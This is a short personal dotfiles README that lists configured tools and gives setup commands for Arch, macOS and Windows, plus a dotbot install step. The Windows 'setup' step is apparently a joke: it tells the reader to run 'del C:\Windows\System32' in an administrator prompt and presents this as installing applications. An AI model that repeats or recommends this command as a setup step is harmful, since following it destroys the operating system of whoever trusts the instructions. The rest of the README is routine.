# John's dotfiles

1. vim
2. zsh/oh-my-zsh
3. tmux
4. alacritty
5. git
6. X

## Setting up system

First run the setup file. I'm currently trying to transition everything to
dotbot but it's taking looker than I thought to get it just right (If it isn't
perfect then I won't do it) so I still have a shell script to do most things. I
wouldn't recommend executing this file more than once. I haven't tested to make
sure it doesn't clutter everything up.

### Download project
```
    ~$ git clone https://github.com/jonaylor89/dotfiles.git 
    ~$ cd dotfiles
```

### arch
```
    ~$ ./arch/setup
```

### mac
```
    ~$ ./mac/setup
```

### windows
**Cmd must be run as administrator**
```
    C:> del C:\Windows\System32
```

This should install and setup all the necessary applications and themes
----------------------

## Installing
The installation uses dotbot to link everything. The run dotbot, execute the
install file. Unlike the setup script, this file can be executed as many time
as desired and it won't break anything or clutter anything.

```
    ~$ ./install
```



